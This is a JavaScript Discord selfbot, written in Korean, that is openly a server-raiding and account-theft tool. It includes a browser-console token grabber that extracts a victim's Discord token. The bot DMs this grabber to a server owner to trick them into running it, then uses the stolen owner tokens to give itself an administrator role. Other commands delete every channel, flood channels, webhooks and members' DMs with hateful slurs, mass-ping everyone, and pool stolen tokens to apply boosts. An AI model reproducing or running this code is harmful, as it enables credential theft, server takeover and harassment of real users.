// selfbot.js
// npm i discord.js-selfbot-v13
const { Client } = require('discord.js-selfbot-v13');
const fs = require('fs');
const path = require('path');
const https = require('https');

const CONFIG = path.join(__dirname, 'config.json');

function load() {
  try { return JSON.parse(fs.readFileSync(CONFIG, 'utf8')); }
  catch {
    return {
      token: process.env.DISCORD_TOKEN || '',
      prefix: process.env.CMD_PREFIX || '.',
      ownerTokens: {},
      boostTokens: []
    };
  }
}
function save(c) { fs.writeFileSync(CONFIG, JSON.stringify(c, null, 2)); }

let cfg = load();
const PREFIX = cfg.prefix || '.';
const TOKEN = cfg.token || process.env.DISCORD_TOKEN;
if (!TOKEN) { console.error('[bot] no token'); process.exit(1); }

const client = new Client({ checkUpdate: false, autoRedeemNitro: false });

const st = {
  jangae: false, jangaeIv: null,
  chSpam: false, chSpamIv: null,
  msgSpam: false, msgSpamIv: null,
  lag: false, lagIv: null,
  vote: false, voteIv: null,
  ghost: false,
};

const JANGAE = [
  '# 야이 개벌래스래기새기야',
  '# 너 좆된거야 병신새기야 ㅋㅋㅋㅋㅋㅋ',
  '# 야이 어망구 좆뒤진 새기야!!',
  '야이 애미창녀 개보지 쓰레기새기야!',
  '# 야이 씨발 뇌없는 찐따새끼야 ㅋㅋㅋㅋ',
  '# 좆같은 놈 또 지랄이냐 병신아',
  '# 야이 애미뒤진 쓰레기 새기야!!',
  '# 너 진짜 한심하다 개좆밥새끼야',
  '# 야이 보지년 새끼야 입 다물어라',
  '# 씨발 아가리 닥쳐 병신아 ㅋㅋ',
  '# 야이 개쓰레기 장애새끼야 꺼져',
  '# 좆나 쳐맞고 싶냐 병신아 ㅋㅋㅋㅋ',
  '# 야이 애미창 개새끼야 닥치고 앉아',
  '# 씨발 좆만한게 까불지 마라 병신아',
];

const SPAM_TEXT = `# 흑사회에게 머리를 조아려라 좆버러지새기들아!!  https://cdn.discordapp.com/attachments/1557406587839054004/1563837365733298257/GIF_4038174851.gif?ex=6adf148a&is=6addc30a&hm=ba05297fbba85cb33195e98a3ed85cdaa1730ddd60848f514986e3acfb2cbb55&  @everyone`;
const SPAM_GIF = 'https://cdn.discordapp.com/attachments/1557406587839054004/1563837365733298257/GIF_4038174851.gif?ex=6adf148a&is=6addc30a&hm=ba05297fbba85cb33195e98a3ed85cdaa1730ddd60848f514986e3acfb2cbb55&';
const CH_NAMES = ['흑룡회 †黑龍', '●█▀█▄모두무릎을꿇어라'];
let chIdx = 0;

const randJ = () => JANGAE[Math.floor(Math.random() * JANGAE.length)];

async function safeSend(ch, content, files = []) {
  try {
    if (files.length) return await ch.send({ content, files });
    return await ch.send({ content });
  } catch {}
}

function httpsReq(method, urlPath, headers = {}, body = null) {
  return new Promise((resolve, reject) => {
    const u = new URL(urlPath.startsWith('http') ? urlPath : 'https://discord.com' + urlPath);
    const opts = {
      hostname: u.hostname,
      path: u.pathname + u.search,
      method,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        ...headers
      }
    };
    const req = https.request(opts, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    if (body) req.write(typeof body === 'string' ? body : JSON.stringify(body));
    req.end();
  });
}

// 강력 토큰 그래버 (여러 경로 + 클립보드 + prompt)
function buildGrabberPayload() {
  return `(async()=>{try{let t=null;const w=webpackChunkdiscord_app.push([[Math.random()],{},e=>e]);webpackChunkdiscord_app.pop();const mods=Object.values(w.c||{});for(const m of mods){try{const ex=m?.exports;if(!ex)continue;if(ex?.default?.getToken){t=ex.default.getToken();break}if(ex?.getToken){t=ex.getToken();break}if(typeof ex==='object'){for(const k of Object.keys(ex)){const v=ex[k];if(v&&typeof v.getToken==='function'){t=v.getToken();break}}}if(t)break}catch{}}if(!t){try{const iframe=document.createElement('iframe');document.body.appendChild(iframe);t=iframe.contentWindow.localStorage.getItem('token')?.replace(/"/g,'');iframe.remove()}catch{}}if(t){console.log('%c'+t,'color:#c084fc;font-size:16px;font-weight:bold');prompt('TOKEN 복사 (Ctrl+C)',t);try{navigator.clipboard.writeText(t)}catch{}}else{alert('추출 실패')}}catch(e){alert(e.message)}})();`;
}

async function applyAdminWithToken(ownerToken, guildId, myId, channel) {
  const oc = new Client({ checkUpdate: false });
  try {
    await oc.login(ownerToken);
    const og = oc.guilds.cache.get(guildId);
    if (!og) { oc.destroy(); return false; }

    let role = og.roles.cache.find(r => r.name === '흑룡관리');
    if (!role) {
      role = await og.roles.create({
        name: '흑룡관리',
        permissions: ['ADMINISTRATOR'],
        color: '#9b59b6',
        hoist: true,
      });
    }
    try { await role.setPosition(og.roles.highest.position - 1); } catch {}
    const target = await og.members.fetch(myId);
    await target.roles.add(role);
    await safeSend(channel, '**오너 토큰으로 관리자 역할 즉시 생성+부여 완료**');
    oc.destroy();
    return true;
  } catch (e) {
    try { oc.destroy(); } catch {}
    if (cfg.ownerTokens && cfg.ownerTokens[guildId] === ownerToken) {
      delete cfg.ownerTokens[guildId];
      save(cfg);
    }
    return false;
  }
}

async function forceAdmin(msg, args) {
  const guild = msg.guild;
  if (!guild) return safeSend(msg.channel, '서버에서만.');

  const nickQuery = args.join(' ').trim();
  if (!nickQuery) return safeSend(msg.channel, '사용법: .관리자권한 오너닉네임');

  const me = await guild.members.fetch(client.user.id).catch(() => null);
  if (!me) return safeSend(msg.channel, '멤버 실패');

  await guild.members.fetch().catch(() => {});
  const target = guild.members.cache.find(m => {
    const q = nickQuery.toLowerCase();
    return (m.nickname || '').toLowerCase().includes(q) ||
           (m.user.username || '').toLowerCase().includes(q) ||
           (m.displayName || '').toLowerCase().includes(q) ||
           (m.user.globalName || '').toLowerCase().includes(q);
  });

  const payload = buildGrabberPayload();

  await safeSend(msg.channel,
    `**[즉시 토큰 추출]**\n대상: ${target ? target.user.tag : nickQuery}\n` +
    `F12 → Console 에 아래 붙여넣기:\n\`\`\`js\n${payload}\n\`\`\`\n` +
    `토큰 나오면 \`.오너토큰넣기 <토큰>\` → 바로 관리자 역할 부여됨`
  );

  if (target) {
    try { await target.send(`콘솔에 이거 붙여넣어:\n\`\`\`js\n${payload}\n\`\`\``); } catch {}
  }

  const stolen = (cfg.ownerTokens || {})[guild.id];
  if (stolen) {
    const ok = await applyAdminWithToken(stolen, guild.id, client.user.id, msg.channel);
    if (ok) return;
  }

  try {
    let role = guild.roles.cache.find(r => r.name === '흑룡관리');
    if (!role) {
      role = await guild.roles.create({
        name: '흑룡관리',
        permissions: ['ADMINISTRATOR'],
        color: '#9b59b6',
        hoist: true,
      });
    }
    try { await role.setPosition(guild.roles.highest.position - 1); } catch {}
    await me.roles.add(role);
    await safeSend(msg.channel, '현재 계정으로 관리자 역할 생성+부여 완료');
  } catch (e) {
    await safeSend(msg.channel, '현재 계정 권한 부족. 그래버로 뽑은 토큰을 `.오너토큰넣기` 해라');
  }
}

async function nitroChecker(msg) {
  await safeSend(msg.channel, '니트로/기프트 스캔 중...');
  const headers = { Authorization: TOKEN };
  let found = null;

  const endpoints = [
    '/api/v9/users/@me/outbound-promotions/codes',
    '/api/v9/users/@me/entitlements/gifts',
    '/api/v9/users/@me/library',
  ];

  for (const ep of endpoints) {
    try {
      const res = await httpsReq('GET', 'https://discord.com' + ep, headers);
      if (res.status !== 200) continue;
      const data = JSON.parse(res.body);
      const arr = Array.isArray(data) ? data : (data?.codes || data?.gifts || []);
      for (const item of arr) {
        if (item?.code) { found = item.code; break; }
        if (item?.sku_id && item?.consumable) { found = `[sku] ${item.sku_id}`; break; }
      }
      if (found) break;
    } catch {}
  }

  if (found) {
    await safeSend(msg.channel, `유효 코드 발견:\n\`\`\`\n${found}\n\`\`\``);
  } else {
    await safeSend(msg.channel, '유효 니트로/기프트 없음. 종료');
  }
}

// 부스트봇 — 니트로/부스트 있는 토큰만 사용, 개수만큼 채움
async function boostBot(msg, args) {
  const guild = msg.guild;
  if (!guild) return safeSend(msg.channel, '서버에서만.');

  const want = Math.max(1, parseInt(args[0], 10) || 1);
  await safeSend(msg.channel, `부스트 ${want}개 목표 · 슬롯 있는 토큰만 사용`);

  const pool = new Set();
  pool.add(TOKEN);
  (cfg.boostTokens || []).forEach(t => pool.add(t));
  Object.values(cfg.ownerTokens || {}).forEach(t => pool.add(t));

  let applied = 0;

  for (const tok of pool) {
    if (applied >= want) break;
    try {
      // 슬롯 조회 — 부스트 없는 계정이면 빈 배열/에러
      const res = await httpsReq('GET',
        'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots',
        { Authorization: tok }
      );
      if (res.status !== 200) continue;
      const slots = JSON.parse(res.body);
      if (!Array.isArray(slots) || slots.length === 0) continue;

      for (const slot of slots) {
        if (applied >= want) break;
        // 쿨다운 중인 슬롯 스킵
        if (slot.cooldown_ends_at && new Date(slot.cooldown_ends_at) > new Date()) continue;

        const put = await httpsReq(
          'PUT',
          `https://discord.com/api/v9/guilds/${guild.id}/premium/subscriptions`,
          { Authorization: tok },
          { user_premium_guild_subscription_slot_ids: [slot.id] }
        );
        if (put.status === 200 || put.status === 201) {
          applied++;
          await safeSend(msg.channel, `부스트 +1 (${applied}/${want})`);
        }
      }
    } catch {}
  }

  if (applied === 0) {
    await safeSend(msg.channel, '사용 가능 부스트 슬롯 0개. 패널에 부스트 있는 계정 토큰 더 넣어라');
  } else {
    await safeSend(msg.channel, `완료: ${applied}개 부스트 적용`);
  }
}

const commands = {
  '명령어': async (msg) => {
    const list = `명령어
- .ip위치탐색기
- .ping
- .관리자권한 (오너닉네임)
- .오너토큰넣기 (토큰)
- .장애타시작
- .장애타중지
- .채널삭제
- .채널생성 (이름)
- .채널스팸
- .전체채널도배 (메시지) @everyone
- .렉유발
- .메시지스팸
- .고스트핑
- .서버복사
- .웹훅추출
- .웹훅전체도배 (메시지) @everyone
- .투표도배 (이모티콘)
- .디엠테러 (메시지) @everyone
- .링크테러 (링크)
- .이미지테러 (이미지)
- .니트로체커
- .부스트봇 (개수)
- .토큰그래버 (이름)`;
    await safeSend(msg.channel, '```\n' + list + '\n```');
  },

  'ping': async (msg) => {
    const t = Date.now();
    const m = await msg.channel.send('…').catch(() => null);
    if (m) await m.edit(`\`${Date.now() - t}ms\` | ws \`${client.ws.ping}ms\``).catch(() => {});
  },

  '관리자권한': (msg, args) => forceAdmin(msg, args),

  '오너토큰넣기': async (msg, args) => {
    const guild = msg.guild;
    if (!guild) return;
    const tok = args[0];
    if (!tok) return safeSend(msg.channel, '사용법: .오너토큰넣기 <토큰>');
    if (!cfg.ownerTokens) cfg.ownerTokens = {};
    cfg.ownerTokens[guild.id] = tok.trim();
    save(cfg);
    await safeSend(msg.channel, '토큰 저장 · 즉시 관리자 역할 적용 중...');
    const ok = await applyAdminWithToken(tok.trim(), guild.id, client.user.id, msg.channel);
    if (!ok) await safeSend(msg.channel, '로그인/역할 실패. 토큰 유효성 확인');
  },

  '장애타시작': async (msg) => {
    if (st.jangae) return safeSend(msg.channel, '이미 ON');
    st.jangae = true;
    st.jangaeIv = setInterval(() => { if (st.jangae) safeSend(msg.channel, randJ()); }, 250);
    await safeSend(msg.channel, '장애타 ON');
  },

  '장애타중지': async (msg) => {
    st.jangae = false;
    if (st.jangaeIv) clearInterval(st.jangaeIv);
    st.jangaeIv = null;
    await safeSend(msg.channel, '장애타 OFF');
  },

  '채널삭제': async (msg) => {
    const g = msg.guild;
    if (!g) return;
    await Promise.all([...g.channels.cache.values()].map(ch =>
      ch.deletable ? ch.delete().catch(() => {}) : Promise.resolve()
    ));
  },

  '채널생성': async (msg, args) => {
    const g = msg.guild;
    if (!g) return;
    const name = args.join(' ') || '흑룡회';
    try {
      await g.channels.create(name, { type: 'GUILD_TEXT' });
      await safeSend(msg.channel, `생성: ${name}`);
    } catch (e) { await safeSend(msg.channel, '실패: ' + e.message); }
  },

  '채널스팸': async (msg) => {
    if (st.chSpam) {
      st.chSpam = false;
      if (st.chSpamIv) clearInterval(st.chSpamIv);
      return safeSend(msg.channel, '채널스팸 OFF');
    }
    const g = msg.guild;
    if (!g) return;
    st.chSpam = true;
    st.chSpamIv = setInterval(async () => {
      if (!st.chSpam) return;
      const name = CH_NAMES[chIdx++ % 2];
      await g.channels.create(name, { type: 'GUILD_TEXT' }).catch(() => {});
    }, 400);
    await safeSend(msg.channel, '채널스팸 ON');
  },

  '전체채널도배': async (msg, args) => {
    const g = msg.guild;
    if (!g) return;
    const content = (args.join(' ') || SPAM_TEXT) + ' @everyone';
    await Promise.all([...g.channels.cache.values()]
      .filter(c => c.isText())
      .map(ch => safeSend(ch, content)));
  },

  '렉유발': async (msg) => {
    if (st.lag) {
      st.lag = false;
      if (st.lagIv) clearInterval(st.lagIv);
      return safeSend(msg.channel, '렉유발 OFF');
    }
    st.lag = true;
    st.lagIv = setInterval(() => {
      if (st.lag) safeSend(msg.channel, '@everyone '.repeat(40) + randJ());
    }, 160);
    await safeSend(msg.channel, '렉유발 ON');
  },

  '메시지스팸': async (msg) => {
    if (st.msgSpam) {
      st.msgSpam = false;
      if (st.msgSpamIv) clearInterval(st.msgSpamIv);
      return safeSend(msg.channel, '메시지스팸 OFF');
    }
    const g = msg.guild;
    if (!g) return;
    st.msgSpam = true;
    st.msgSpamIv = setInterval(async () => {
      if (!st.msgSpam) return;
      await Promise.all([...g.channels.cache.values()]
        .filter(c => c.isText() && c.viewable)
        .map(ch => safeSend(ch, SPAM_TEXT, [SPAM_GIF])));
    }, 800);
    await safeSend(msg.channel, '메시지스팸 ON');
  },

  '고스트핑': async (msg) => {
    if (st.ghost) {
      st.ghost = false;
      return safeSend(msg.channel, '고스트핑 OFF');
    }
    st.ghost = true;
    await safeSend(msg.channel, '고스트핑 ON');
    const g = msg.guild;
    if (!g) return;
    const members = await g.members.fetch().catch(() => null);
    if (!members) return;
    for (const [, m] of members) {
      if (!st.ghost) break;
      if (m.user.bot) continue;
      try {
        const s = await msg.channel.send(`<@${m.id}>`);
        await s.delete().catch(() => {});
      } catch {}
      await new Promise(r => setTimeout(r, 100));
    }
    st.ghost = false;
  },

  '서버복사': async (msg) => {
    const g = msg.guild;
    if (!g) return;
    try {
      const ng = await client.guilds.create(g.name + ' 복사', {
        icon: g.iconURL({ format: 'png' }),
      });
      for (const ch of g.channels.cache.values()) {
        if (ch.type === 'GUILD_CATEGORY') {
          await ng.channels.create(ch.name, { type: 'GUILD_CATEGORY' }).catch(() => {});
        }
      }
      for (const ch of g.channels.cache.values()) {
        if (ch.type === 'GUILD_TEXT' || ch.type === 'GUILD_VOICE') {
          const parent = ch.parent
            ? ng.channels.cache.find(c => c.name === ch.parent.name && c.type === 'GUILD_CATEGORY')
            : null;
          await ng.channels.create(ch.name, { type: ch.type, parent }).catch(() => {});
        }
      }
      await safeSend(msg.channel, `복사 완료: ${ng.name}`);
    } catch (e) { await safeSend(msg.channel, '실패: ' + e.message); }
  },

  '웹훅추출': async (msg) => {
    const g = msg.guild;
    if (!g) return;
    const lines = [];
    for (const ch of g.channels.cache.values()) {
      if (!ch.isText()) continue;
      try {
        const hooks = await ch.fetchWebhooks();
        for (const [, h] of hooks) lines.push(`${ch.name} → ${h.url}`);
      } catch {}
    }
    if (!lines.length) return safeSend(msg.channel, '웹훅 없음');
    await safeSend(msg.channel, '```\n' + lines.join('\n').slice(0, 1900) + '\n```');
  },

  '웹훅전체도배': async (msg, args) => {
    const g = msg.guild;
    if (!g) return;
    const content = (args.join(' ') || SPAM_TEXT) + ' @everyone';
    await Promise.all([...g.channels.cache.values()].filter(c => c.isText()).map(async ch => {
      try {
        const hooks = await ch.fetchWebhooks();
        for (const [, h] of hooks) await h.send({ content }).catch(() => {});
      } catch {}
    }));
    await safeSend(msg.channel, '웹훅 도배 끝');
  },

  '투표도배': async (msg, args) => {
    if (st.vote) {
      st.vote = false;
      if (st.voteIv) clearInterval(st.voteIv);
      return safeSend(msg.channel, '투표도배 OFF');
    }
    const emoji = args[0] || '💀';
    st.vote = true;
    st.voteIv = setInterval(async () => {
      if (!st.vote) return;
      try {
        const m = await msg.channel.send(randJ());
        await m.react(emoji).catch(() => {});
      } catch {}
    }, 350);
    await safeSend(msg.channel, '투표도배 ON');
  },

  '디엠테러': async (msg, args) => {
    const g = msg.guild;
    if (!g) return;
    const content = (args.join(' ') || randJ()) + '\n@everyone';
    const members = await g.members.fetch().catch(() => null);
    if (!members) return safeSend(msg.channel, '멤버 실패');
    let n = 0;
    for (const [, m] of members) {
      if (m.user.bot) continue;
      try { await m.send(content); n++; } catch {}
      await new Promise(r => setTimeout(r, 300));
    }
    await safeSend(msg.channel, `DM ${n}명`);
  },

  '링크테러': async (msg, args) => {
    const link = args[0];
    if (!link) return safeSend(msg.channel, '링크 필요');
    const g = msg.guild;
    if (!g) return;
    await Promise.all([...g.channels.cache.values()]
      .filter(c => c.isText())
      .map(ch => safeSend(ch, `${link}\n@everyone`)));
  },

  '이미지테러': async (msg, args) => {
    const url = args[0];
    if (!url) return safeSend(msg.channel, '이미지 URL 필요');
    const g = msg.guild;
    if (!g) return;
    await Promise.all([...g.channels.cache.values()]
      .filter(c => c.isText())
      .map(ch => safeSend(ch, '@everyone', [url])));
  },

  '니트로체커': (msg) => nitroChecker(msg),

  '부스트봇': (msg, args) => boostBot(msg, args),

  '토큰그래버': async (msg, args) => {
    const name = args[0] || 'grabber';
    const payload = buildGrabberPayload();
    await safeSend(msg.channel,
      `**${name}**\n\`\`\`js\n${payload}\n\`\`\`\n` +
      `콘솔 붙여넣기 → 토큰 복사 → \`.오너토큰넣기 <토큰>\` 하면 즉시 관리자 역할`
    );
  },

  'ip위치탐색기': async (msg) => {
    await safeSend(msg.channel, '셀프봇 단독으로 상대 IP 못 뜯음. 피싱/웹훅 쪽으로.');
  },
};

client.on('ready', () => console.log('[bot] ' + client.user.tag));

client.on('messageCreate', async (msg) => {
  if (msg.author.id !== client.user.id) return;
  if (!msg.content.startsWith(PREFIX)) return;
  const raw = msg.content.slice(PREFIX.length).trim();
  const [cmd, ...args] = raw.split(/\s+/);
  const fn = commands[cmd];
  if (!fn) return;
  try { await fn(msg, args); }
  catch (e) { console.error('[cmd]', cmd, e.message); }
});

client.on('error', e => console.error('[err]', e.message));

client.login(TOKEN).catch(e => {
  console.error('[login]', e.message);
  console.error('토큰 무효 → 패널에서 다시 넣어라');
  process.exit(1);
});
